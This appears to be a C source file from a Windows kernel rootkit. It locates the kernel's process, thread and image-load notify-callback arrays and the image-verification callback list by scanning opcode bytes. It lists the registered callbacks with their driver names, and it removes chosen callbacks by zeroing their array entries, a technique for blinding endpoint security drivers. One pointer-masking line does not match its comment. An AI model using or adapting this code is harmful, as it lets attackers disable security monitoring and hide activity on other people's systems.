#include <Rhaast.h>

NTSTATUS RspCallbackSize(
    _In_  RS_CALLBACK_TYPE Type,
    _Out_ PULONG           Size  
);

PVOID RspCallbackArray(
    _In_ RS_CALLBACK_TYPE Type
);

/**
 * @brief
 *      removes callback from specified type array/list
 *
 * @param Type
 *      type of callback to remove
 *
 * @param Callback
 *      callback to remove
 *
 * @return
 *      status of function
 */
NTSTATUS RsCallbackRemove(
    _In_ RS_CALLBACK_TYPE Type,
    _In_ ULONG_PTR        Callback
) {
    PVOID     ArrayAddr  = NULL;
    NTSTATUS  NtStatus   = STATUS_UNSUCCESSFUL;
    ULONG_PTR Pointer    = NULL;

    /* this type is not supported
     * TODO: implement for Driver verification */
    if ( Type == NoneCallback || Type == DriverVerificationCallback ) {
        NtStatus = STATUS_INVALID_PARAMETER;
        goto END; 
    }

    /* get array/list address */
    if ( ! ( ArrayAddr = RspCallbackArray( Type ) ) ) {
        goto END;
    }

    if ( Type == PsProcessCreationCallback || 
         Type == PsThreadCreationCallback  ||
         Type == PsImageLoadCallback       )
    {
        /* iterate over notify array */
        for ( int i = 0; i < RSCB_MAX_CALLBACKS; i++ )
        {
            if ( ( Pointer = DREF_UPTR( U_PTR( ArrayAddr ) + ( i * sizeof( UINT_PTR ) ) ) ) ) 
            {
                /* get the actual callback function
                 * remove the last 4 bytes, jump over the first 8 */
                Pointer &= ~( 1ULL << 3 ) + 0x1;
                Pointer = DREF_UPTR( Pointer );

                /* is it the callback we are searching for */
                if ( Pointer == Callback ) 
                {
                    /* overwrite callback from array */
                    *( ( PVOID* ) C_PTR( U_PTR( ArrayAddr ) + ( i * sizeof( UINT_PTR ) ) ) ) = NULL;

                    /* end. we were successful */
                    NtStatus = STATUS_SUCCESS;
                    break; 
                }
            }
        }
        
    } else {
        NtStatus = STATUS_INVALID_PARAMETER;
    }

END:
    return NtStatus;
}

/**
 * @brief
 *      query list of registered callback
 *      from the specified callback type
 *
 * @param Type
 *      callback to query.
 *      if NoneCallback has been specified the function
 *      is going to attempt to query every
 *      supporting callback type 
 *
 * @param Data
 *      pointer to allocated memory where
 *      the queried data is going to be written to.
 *
 * @param Size 
 *      size of allocated memory in QueryData and how much can be written to it.
 *      if 0 then it is going to attempt to calculate the callback list size
 *      of the given callback type and how much should be allocated for QueryData. 
 *
 * @return
 *      status of function 
 */
NTSTATUS RsCallbackQuery(
    _In_       RS_CALLBACK_TYPE  Type,
    _Out_opt_  PRS_CALLBACK_DATA Data,
    _Out_      PULONG            Size
) {
    NTSTATUS   NtStatus       = STATUS_SUCCESS;
    PVOID      ArrayAddr      = NULL;
    ULONG_PTR  Callback       = 0;
    ULONG      Length         = 0;
    ULONG      DataOffset     = 0;
    ULONG      DataSize       = 0;
    CHAR       DrvName[ 258 ] = { 0 };
    PVOID      DrvBase        = NULL;

    /* get size of query data */
    if ( ! NT_SUCCESS( NtStatus = RspCallbackSize( Type, &Length ) ) ) {
        PRINTF( "RspCallbackSize Failed: %p\n", NtStatus )
        goto END;
    }

    /* if Data is not specified then only give back the size */
    if ( ! Data ) {
        goto END;
    }

    /* request for every callback */
    if ( Type == NoneCallback )
    {
        /* iterate over all the types and add entire size to Length */
        for ( int i = 1; i <= RS_CALLBACK_TYPE_SIZE; i++ )
        {
            /* query for specified callback list */
            if ( ! NT_SUCCESS( NtStatus = RsCallbackQuery( i, C_PTR( U_PTR( Data ) + DataOffset ), &DataSize ) ) ) {
                PUTS( "Failed to query all callbacks" )
                goto END; 
            }

            DataOffset += DataSize;
        }
    }
    else if ( Type == PsProcessCreationCallback || 
              Type == PsThreadCreationCallback  ||
              Type == PsImageLoadCallback       )
    {
        /* get array address */
        if ( ! ( ArrayAddr = RspCallbackArray( Type ) ) ) {
            return STATUS_UNSUCCESSFUL;
        }
        
        for ( int i = 0; i < RSCB_MAX_CALLBACKS; i++ )
        {
            if ( ( Callback = DREF_UPTR( U_PTR( ArrayAddr ) + ( i * sizeof( UINT_PTR ) ) ) ) ) {

                /* get the actual callback function
                 * remove the last 4 bytes, jump over the first 8 */
                Callback &= ~( 1ULL << 3 ) + 0x1;
                Callback  = U_PTR( DREF_PTR( Callback ) );

                /* query driver name & base from callback address */
                if ( ! NT_SUCCESS( NtStatus = RsDrvNameBaseFromAddr( Callback, ( PCHAR* ) & DrvName, ( PVOID ) & DrvBase ) ) ) {
                    PRINTF( "RsDrvNameBaseFromAddr Failed: %p\n", NtStatus )
                }

                Data->Type            = Type;
                Data->Callback        = Callback;
                Data->DriverBase      = U_PTR( DrvBase );
                Data->NextEntryOffset = ( i == ( RSCB_MAX_CALLBACKS - 1 ) ) ? 0 : sizeof( RS_CALLBACK_DATA );

                RtlCopyMemory( Data->DriverName, DrvName, sizeof( DrvName ) );

                /* increment to next entry */
                Data = C_PTR( U_PTR( Data ) + sizeof( RS_CALLBACK_DATA ) );

                /* clear out driver name */
                RtlSecureZeroMemory( DrvName, sizeof( DrvName ) );
            }
        }
        
        NtStatus = STATUS_SUCCESS;
    }
    else if ( Type == DriverVerificationCallback )
    {
        /* get driver callback object list */
        if ( ! ( ArrayAddr = RspCallbackArray( Type ) ) ) {
            return STATUS_UNSUCCESSFUL;
        }

        ArrayAddr = DREF_PTR( ArrayAddr );
        Callback  = U_PTR( ( ( PCALLBACK_OBJECT ) ( ArrayAddr ) )->RegisteredCallbacks.Flink );

        /* iterate over linked list */
        do {

            /* query driver name & base from callback address */
            if ( ! NT_SUCCESS( NtStatus = RsDrvNameBaseFromAddr( C_PTR( ( ( PCALLBACK_REGISTRATION ) C_PTR( Callback ) )->CallbackFunction ), ( PCHAR* ) & DrvName, ( PVOID ) & DrvBase ) ) ) {
                PRINTF( "RsDrvNameBaseFromAddr Failed: %p\n", NtStatus )
            }

            Data->Type            = Type;
            Data->Callback        = U_PTR( ( ( PCALLBACK_REGISTRATION ) C_PTR( Callback ) )->CallbackFunction );
            Data->DriverBase      = U_PTR( DrvBase );
            Data->NextEntryOffset = sizeof( RS_CALLBACK_DATA );

            RtlCopyMemory( Data->DriverName, DrvName, sizeof( DrvName ) );

            /* increment to next entry */
            Data = C_PTR( U_PTR( Data ) + sizeof( RS_CALLBACK_DATA ) );

            /* clear out driver name */
            RtlSecureZeroMemory( DrvName, sizeof( DrvName ) );

            /* next entry */
            Callback = U_PTR( ( ( PCALLBACK_REGISTRATION ) C_PTR( Callback ) )->Link.Flink );

            /* break */
            if ( Callback == U_PTR( & ( ( PCALLBACK_OBJECT ) ( ArrayAddr ) )->RegisteredCallbacks ) ) {
                Data->NextEntryOffset = 0;
                break;
            }

        } while ( TRUE ); 
    }
    
END:
    if ( Size ) {
        *Size = Length;
    }

    return NtStatus; 
}

/**
 * @brief
 *      retrieve the callback notify array based
 *      on the specified type.
 *
 * @param Type
 *      callback type to get array address from
 *
 * @return
 *      pointer to callback notify array
 */
PVOID RspCallbackArray(
    _In_ RS_CALLBACK_TYPE Type
) {
    PVOID Address = NULL;
    ULONG Offset  = 0;

    /* this function doesn't support this type */
    if ( Type == NoneCallback ) {
        return NULL;
    }
    
    if ( Type == PsProcessCreationCallback || 
         Type == PsThreadCreationCallback  ||
         Type == PsImageLoadCallback       ) 
    {
        /* set api hash */
        if ( Type == PsImageLoadCallback ) {
            Offset = H_API_PSSETLOADIMAGENOTIFYROUTINE;
        } else {
            Offset = ( Type == PsProcessCreationCallback ) ? H_API_PSSETCREATEPROCESSNOTIFYROUTINE : H_API_PSSETCREATETHREADNOTIFYROUTINE; 
        }

        /* try to resolve routine based on type we wanna resolve */
        if ( ! ( Address = RsLdrFunction( Offset ) ) ) {
            return NULL;
        }

        /*
         * search for the sub private routine that originally sets the
         * callback to the routine address array.
         */
        for ( int i = 0; i < RSCB_MAX_INST_SEARCH; i++ ) 
        {
            /* check if it's "call/jmp routine" */
            if ( ( DREF_U8( U_PTR( Address ) + i ) == ASM_CALL ) || ( DREF_U8( U_PTR( Address ) + i ) == ASM_JMP ) ) 
            {
                /* get offset of private routine */
                Offset = DREF_U32( U_PTR( Address ) + i + 1 );
                
                /* get the pointer of private routine */
                Address = C_PTR( U_PTR( Address ) + RsUtilRoutineEnd( Address ) + U_PTR( Offset ) );

                break;
            }
        }

        /*
         * now searching for the creation notify routine address array. 
         */
        for ( int i = 0; i < RSCB_MAX_INST_SEARCH; i++ ) 
        {
            /* check for "lea r13/rcx" instruction */
            if ( ( DREF_U16( U_PTR( Address ) + i ) == ASM_LEA_R13 ) || 
                 ( DREF_U16( U_PTR( Address ) + i ) == ASM_LEA_RCX ) 
            ) {
                /* get offset of array */
                Offset = DREF_U32( U_PTR( Address ) + i + 3 );

                /* get array address */
                Address = C_PTR( U_PTR( Address ) + i + 7 + Offset );

                break;
            }
        }

    }
    else if ( Type == DriverVerificationCallback )
    {
        /* resolve address of the "SeRegisterImageVerificationCallback" routine */
        if ( ! ( Address = RsLdrFunction( H_API_SEREGISTERIMAGEVERIFICATIONCALLBACK ) ) ) {
            return NULL;
        }

        /*
         * SeRegisterImageVerificationCallback:
         *  75 3D                  jnz     short loc_140873708
         *  48 8B 0D B6 DB 3B 00   mov     rcx, cs:ExCbSeImageVerificationDriverInfo
         *  4D 8B C1               mov     r8, r9
         *  48 8B D0               mov     rdx, rax
         *
         * search for the "ExCbSeImageVerificationDriverInfo" linked list
         */
        for ( int i = 0; i < RSCB_MAX_INST_SEARCH; i++ ) 
        {
            if ( DREF_U16( U_PTR( Address ) + i ) == ASM_MOV_RCX ) 
            {
                /* get offset of "ExCbSeImageVerificationDriverInfo" */
                Offset = DREF_U32( U_PTR( Address ) + i + 3 );

                /* get "ExCbSeImageVerificationDriverInfo" address */
                Address = C_PTR( U_PTR( Address ) + i + 7 + Offset );

                break;
            }
        }
    }

    return Address; 
}

/**
 * @brief
 *      calculates the exact size that should
 *      be allocated for the callback query data
 *
 * @param Type
 *      callback type to query data size
 *
 * @param Size
 *      pointer to size variable
 *
 * @return
 *      status of function
 */
NTSTATUS RspCallbackSize(
    _In_  RS_CALLBACK_TYPE Type,
    _Out_ PULONG           Size
) {
    NTSTATUS  NtStatus   = STATUS_UNSUCCESSFUL;
    ULONG     Length     = 0;
    ULONG     AllLength  = 0;
    PVOID     ArrayAddr  = NULL;
    PVOID     PointerObj = NULL; 
    ULONG_PTR Callback   = 0;

    if ( ! Size ) {
        return STATUS_INVALID_PARAMETER;
    }

    if ( Type == NoneCallback )
    {
        /* iterate over all the types and add entire size to Length */
        for ( int i = 1; i <= RS_CALLBACK_TYPE_SIZE; i++ )
        {
            if ( ! NT_SUCCESS( NtStatus = RspCallbackSize( i, &AllLength ) ) ) {
                PRINTF( "Failed to get size for type:[%d]\n", i )
            } else {
                Length += AllLength;
            }
        }
    }
    else if ( Type == PsProcessCreationCallback || 
              Type == PsThreadCreationCallback  ||
              Type == PsImageLoadCallback       )
    {
        /* get array address */
        if ( ! ( ArrayAddr = RspCallbackArray( Type ) ) ) {
            return STATUS_UNSUCCESSFUL;
        }

        for ( int i = 0; i < RSCB_MAX_CALLBACKS; i++ )
        {
            if ( ( Callback = DREF_UPTR( U_PTR( ArrayAddr ) + ( i * sizeof( UINT_PTR ) ) ) ) ) {
                Length += sizeof( RS_CALLBACK_DATA );
            }
        }

        NtStatus = STATUS_SUCCESS;
    }
    else if ( Type == DriverVerificationCallback )
    {
        /* get driver callback object list */
        if ( ! ( ArrayAddr = RspCallbackArray( Type ) ) ) {
            return STATUS_UNSUCCESSFUL;
        }

        ArrayAddr  = DREF_PTR( ArrayAddr );
        PointerObj = ( ( PCALLBACK_OBJECT ) ( ArrayAddr ) )->RegisteredCallbacks.Flink;

        /* iterate over linked list */
        while ( PointerObj != C_PTR( & ( ( PCALLBACK_OBJECT ) ( ArrayAddr ) )->RegisteredCallbacks ) ) {
            Length     += sizeof( RS_CALLBACK_DATA );
            PointerObj =  ( ( PCALLBACK_REGISTRATION ) ( PointerObj ) )->Link.Flink;
        }

        NtStatus = STATUS_SUCCESS;
    }
    else
    {
        NtStatus = STATUS_INVALID_PARAMETER;
    }

    *Size = Length;

    return NtStatus;
}